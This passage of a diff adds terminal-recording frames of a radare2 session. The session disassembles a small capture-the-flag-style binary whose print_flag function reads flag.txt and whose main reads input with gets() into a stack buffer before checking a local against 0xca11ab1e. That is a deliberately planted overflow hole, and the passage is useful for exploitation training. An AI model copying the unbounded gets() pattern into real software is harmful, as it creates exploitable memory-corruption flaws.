+    [
+      0.000265,
+      "\r\n"
+    ],
+    [
+      4.5e-05,
+      "\u001b[36m| \u001b[0m \u001b[31m sym.print_flag\u001b[0m ();"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_dh @ ebp-0xd\u001b[0m"
+    ],
+    [
+      6.8e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_ch @ ebp-0xc\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m   \u001b[31m; CALL XREF from 0x08048606 (main)\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x0804854b\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpush\u001b[36m ebp\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x0804854c\u001b[0m      \u001b[37m89\u001b[37me5\u001b[0m           \u001b[37mmov\u001b[36m ebp\u001b[0m,\u001b[36m\u001b[36m esp\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.4e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x0804854e\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m18\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x18\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      6.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048551\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      4.5e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048554\u001b[0m      \u001b[33m68\u001b[37mb0\u001b[37m86\u001b[37m04\u001b[37m08\u001b[0m     \u001b[35mpush\u001b[36m \u001b[33mstr.How_did_you_figure_out_my_secret__\u001b[0m\u001b[0m\u001b[31m ; \"How did you figure out my secret?!\" @ 0x80486b0\u001b[0m"
+    ],
+    [
+      4.2e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048559\u001b[0m      \u001b[37me8\u001b[37m92\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x0804855e\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048561\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m08\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[33m 8\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048564\u001b[0m      \u001b[33m68\u001b[37md3\u001b[37m86\u001b[37m04\u001b[37m08\u001b[0m     \u001b[35mpush\u001b[36m \u001b[33m0x80486d3\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      5.9e-05,
+      "\r\n"
+    ],
+    [
+      5.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048569\u001b[0m      \u001b[33m68\u001b[37md5\u001b[37m86\u001b[37m04\u001b[37m08\u001b[0m     \u001b[35mpush\u001b[36m \u001b[33mstr.flag.txt\u001b[0m\u001b[0m\u001b[31m           ; \"flag.txt\" @ 0x80486d5\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x0804856e\u001b[0m      \u001b[37me8\u001b[37mad\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.fopen\u001b[0m\u001b[0m\u001b[31m         ; file*fopen(const char *filename,"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m"
+    ],
+    [
+      4.2e-05,
+      "0x08048573\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x08048576\u001b[0m      \u001b[37m89\u001b[33m45\u001b[37mf4\u001b[0m         \u001b[37mmov dword\u001b[36m \u001b[0m[\u001b[36mlocal_ch\u001b[0m]\u001b[36m\u001b[0m,\u001b[36m\u001b[36m eax\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m      ,=< \u001b[0m\u001b[32m0x08048579\u001b[0m      \u001b[37meb\u001b[37m10\u001b[0m           \u001b[32mjmp 0x804858b\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      6.5e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m      |   \u001b[0m   \u001b[31m; JMP XREF from 0x080485a0 (sym.print_flag)\u001b[0m"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     .--> \u001b[0m\u001b[32m0x0804857b\u001b[0m      \u001b[37m0f\u001b[37mbe\u001b[33m45\u001b[37mf3\u001b[0m       \u001b[37mmovsx\u001b[36m eax\u001b[0m,\u001b[36m byte\u001b[36m \u001b[0m[\u001b[36mlocal_dh\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.7e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m|   \u001b[0m\u001b[32m0x0804857f\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m|   \u001b[0m\u001b[32m0x08048582\u001b[0m      \u001b[33m50\u001b[0m             \u001b[35mpush\u001b[36m eax\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m|   \u001b[0m\u001b[32m0x08048583\u001b[0m      \u001b[37me8\u001b[37ma8\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.putchar\u001b[0m\u001b[0m\u001b[31m       ; int putchar(int c)"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m|   \u001b[0m\u001b[32m0x08048588\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     !|   \u001b[0m   \u001b[31m; JMP XREF from 0x08048579 (sym.print_flag)\u001b[0m"
+    ],
+    [
+      5.1e-05,
+      "\r\n"
+    ],
+    [
+      3.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m`-> \u001b[0m\u001b[32m0x0804858b\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m    \u001b[0m\u001b[32m0x0804858e\u001b[0m      \u001b[31mff\u001b[33m75\u001b[37mf4\u001b[0m         \u001b[35mpush dword\u001b[36m \u001b[0m[\u001b[36mlocal_ch\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.3e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m    \u001b[0m\u001b[32m0x08048591\u001b[0m      \u001b[37me8\u001b[33m4a\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp._IO_getc\u001b[0m\u001b[0m\u001b[31m      ; int getc(FILE *steam)"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m    \u001b[0m\u001b[32m0x08048596\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m    \u001b[0m\u001b[32m0x08048599\u001b[0m "
+    ],
+    [
+      4.6e-05,
+      "     \u001b[37m88\u001b[33m45\u001b[37mf3\u001b[0m         \u001b[37mmov byte\u001b[36m \u001b[0m[\u001b[36mlocal_dh\u001b[0m]\u001b[36m\u001b[0m,\u001b[36m\u001b[36m al\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.9e-05,
+      "\r\n"
+    ],
+    [
+      3.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     \u001b[34m|\u001b[36m    \u001b[0m\u001b[32m0x0804859c\u001b[0m      \u001b[37m80\u001b[33m7d\u001b[37mf3\u001b[31mff\u001b[0m       \u001b[36mcmp byte\u001b[36m \u001b[0m[\u001b[36mlocal_dh\u001b[0m]\u001b[36m\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xff\u001b[0m\u001b[0m\u001b[31m   ; [0xff:1]=8\u001b[0m"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m     `==< \u001b[0m\u001b[32m0x080485a0\u001b[0m      \u001b[33m75\u001b[37md9\u001b[0m           \u001b[32mjne 0x804857b\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485a2\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      7.1e-05,
+      "\r\n"
+    ],
+    [
+      2.8e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485a5\u001b[0m      \u001b[33m6a\u001b[37m0a\u001b[0m           \u001b[35mpush\u001b[36m \u001b[33m0xa\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485a7\u001b[0m      \u001b[37me8\u001b[37m84\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.putchar\u001b[0m\u001b[0m\u001b[31m       ; int putchar(int c)"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485ac\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485af\u001b[0m      \u001b[37m90\u001b[0m             \u001b[34mnop\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485b0\u001b[0m      \u001b[37mc9\u001b[0m             \u001b[1;35mleave\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m\\ \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485b1\u001b[0m      \u001b[37mc3\u001b[0m             \u001b[31mret\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "\u001b[0K\r"
+    ],
+    [
+      3.1e-05,
+      "\u001b[0K\r\u001b[33m[0x0804854b]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s\r\u001b[33m[0x0804854b]>\u001b[0m s"
+    ],
+    [
+      0.07212,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s \r\u001b[33m[0x0804854b]>\u001b[0m s "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s m\r\u001b[33m[0x0804854b]>\u001b[0m s m"
+    ],
+    [
+      0.300039,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s ma\r\u001b[33m[0x0804854b]>\u001b[0m s ma"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s mai\r\u001b[33m[0x0804854b]>\u001b[0m s mai"
+    ],
+    [
+      0.062098,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s main\r\u001b[33m[0x0804854b]>\u001b[0m s main"
+    ],
+    [
+      0.393019,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x0804854b]>\u001b[0m s main\r\n\u001b[0K\r"
+    ],
+    [
+      2.7e-05,
+      "\u001b[0K\r\u001b[33m[0x080485b2]>\u001b[0m "
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m p\r\u001b[33m[0x080485b2]>\u001b[0m p"
+    ],
+    [
+      0.010687,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m pd\r\u001b[33m[0x080485b2]>\u001b[0m pd"
+    ],
+    [
+      0.080386,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m pdf\r\u001b[33m[0x080485b2]>\u001b[0m pdf"
+    ],
+    [
+      0.5,
+      "\u001b[0K\r\r\u001b[2K\r\r\u001b[33m[0x080485b2]>\u001b[0m pdf\r\n"
+    ],
+    [
+      0.001317,
+      "  \u001b[36m          \u001b[0m;-- \u001b[36mmain:"
+    ],
+    [
+      5e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m/ \u001b[0m\u001b[31m(fcn) main\u001b[0m 120"
+    ],
+    [
+      6.9e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m \u001b[31m main\u001b[0m ();"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_27h @ ebp-0x27\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_ch @ ebp-0xc\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_4h_2 @ ebp-0x4\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[37m; var int local_4h @ esp+0x4\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      6.7e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m   \u001b[31m; DATA XREF from 0x08048467 (entry0)\u001b[0m"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485b2\u001b[0m      \u001b[37m8d\u001b[33m4c\u001b[33m24\u001b[37m04\u001b[0m       \u001b[37mlea\u001b[36m ecx\u001b[0m,\u001b[36m\u001b[36m \u001b[0m[\u001b[36mlocal_4h\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[31m         ; 0x4\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485b6\u001b[0m      \u001b[37m83\u001b[37me4\u001b[37mf0\u001b[0m         \u001b[36mand\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xfffffff0\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485b9\u001b[0m      \u001b[31mff\u001b[33m71\u001b[37mfc\u001b[0m         \u001b[35mpush dword \u001b[0m[\u001b[36mecx \u001b[0m-\u001b[36m\u001b[36m 4\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      5.1e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485bc\u001b[0m      \u001b[33m55\u001b[0m             \u001b[35mpush\u001b[36m ebp\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485bd\u001b[0m      \u001b[37m89\u001b[37me5\u001b[0m           \u001b[37mmov\u001b[36m ebp\u001b[0m,\u001b[36m\u001b[36m esp\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      6.4e-05,
+      "\r\n"
+    ],
+    [
+      4.8e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485bf\u001b[0m      \u001b[33m51\u001b[0m             \u001b[35mpush\u001b[36m ecx\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485c0\u001b[0m      \u001b[37m83\u001b[37mec\u001b[33m24\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x24\u001b[0m\u001b[0m\u001b[31m               ; '$'\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485c3\u001b[0m      \u001b[37ma1\u001b[33m30\u001b[37ma0\u001b[37m04\u001b[37m08\u001b[0m     \u001b[37mmov\u001b[36m eax\u001b[0m,\u001b[36m dword\u001b[36m \u001b[0m\u001b[33mobj.stdout\u001b[0m\u001b[36m\u001b[0m\u001b[0m\u001b[31m   ; [0x804a030:4]=0x3a434347\u001b[31m ; \"GCC: (Ubuntu 5.4.0-6ubuntu1~16.04.4) 5.4.0 20160609\" @ 0x804a030\u001b[0m"
+    ],
+    [
+      4.2e-05,
+      "\r\n"
+    ],
+    [
+      4.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485c8\u001b[0m      \u001b[33m6a\u001b[32m00\u001b[0m           \u001b[35mpush\u001b[33m 0\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.3e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485ca\u001b[0m      \u001b[33m6a\u001b[32m00\u001b[0m           \u001b[35mpush\u001b[33m 0\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      6.4e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485cc\u001b[0m      \u001b[33m6"
+    ],
+    [
+      4.8e-05,
+      "a\u001b[37m02\u001b[0m           \u001b[35mpush\u001b[33m 2\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485ce\u001b[0m      \u001b[33m50\u001b[0m             \u001b[35mpush\u001b[36m eax\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.5e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485cf\u001b[0m      \u001b[37me8\u001b[33m3c\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.setvbuf\u001b[0m\u001b[0m\u001b[31m       ; int setvbuf(FILE*stream, char*buf, int mode, size_t size)"
+    ],
+    [
+      4.2e-05,
+      "\r\n"
+    ],
+    [
+      4.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485d4\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485d7\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485da\u001b[0m      \u001b[33m68\u001b[37mde\u001b[37m86\u001b[37m04\u001b[37m08\u001b[0m     \u001b[35mpush\u001b[36m \u001b[33mstr.Enter_the_secret_word:\u001b[0m\u001b[0m\u001b[31m ; \"Enter the secret word:\" @ 0x80486de\u001b[0m"
+    ],
+    [
+      6.6e-05,
+      "\r\n"
+    ],
+    [
+      4.7e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485df\u001b[0m      \u001b[37me8\u001b[37m0c\u001b[37mfe\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.puts\u001b[0m\u001b[0m\u001b[31m          ; int puts(const char *s)"
+    ],
+    [
+      4.3e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485e4\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.4e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485e7\u001b[0m      \u001b[37mc7\u001b[33m45\u001b[37mf4\u001b[32m00\u001b[32m00\u001b[32m00\u001b[37m.\u001b[0m  \u001b[37mmov dword\u001b[36m \u001b[0m[\u001b[36mlocal_ch\u001b[0m]\u001b[36m\u001b[0m,\u001b[36m\u001b[33m 0\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485ee\u001b[0m      \u001b[37m83\u001b[37mec\u001b[37m0c\u001b[0m         \u001b[33msub\u001b[36m esp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xc\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485f1\u001b[0m      \u001b[37m8d\u001b[33m45\u001b[37md9\u001b[0m         \u001b[37mlea\u001b[36m eax\u001b[0m,\u001b[36m\u001b[36m \u001b[0m[\u001b[36mlocal_27h\u001b[0m]\u001b[36m\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      8.3e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485f4\u001b[0m      \u001b[33m50\u001b[0m             \u001b[35mpush\u001b[36m eax\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      4.5e-05,
+      "\r\n"
+    ],
+    [
+      4.2e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485f5\u001b[0m      \u001b[37me8\u001b[37md6\u001b[37mfd\u001b[31mff\u001b[31mff\u001b[0m     \u001b[1;32mcall sym.imp.gets\u001b[0m\u001b[0m\u001b[31m          ; char*gets(char *s)"
+    ],
+    [
+      4.1e-05,
+      "\r\n"
+    ],
+    [
+      4.1e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485fa\u001b[0m      \u001b[37m83\u001b[37mc4\u001b[37m10\u001b[0m         \u001b[33madd\u001b[36m e"
+    ],
+    [
+      4.4e-05,
+      "sp\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0x10\u001b[0m\u001b[0m\u001b[0m"
+    ],
+    [
+      2.7e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m          \u001b[0m\u001b[32m0x080485fd\u001b[0m      \u001b[37m81\u001b[33m7d\u001b[37mf4\u001b[37m1e\u001b[37mab\u001b[37m11\u001b[37m.\u001b[0m  \u001b[36mcmp dword\u001b[36m \u001b[0m[\u001b[36mlocal_ch\u001b[0m]\u001b[36m\u001b[0m,\u001b[36m\u001b[36m \u001b[33m0xca11ab1e\u001b[0m\u001b[0m\u001b[31m ; [0xca11ab1e:4]=-1\u001b[0m"
+    ],
+    [
+      2.5e-05,
+      "\r\n"
+    ],
+    [
+      2.6e-05,
+      "\u001b[36m| \u001b[0m\u001b[36m      ,=< \u001b[0m\u001b[32m0x08048604\u001b[0m      \u001b[33m75\u001b[37m07\u001b[0m           \u001b[32mjne 0x804860d\u001b[0m\u001b[0m"
+    ],
+    [
+      2.6e-05,
+      "\r\n"
+    ],
+    [
+      2.7e-05,
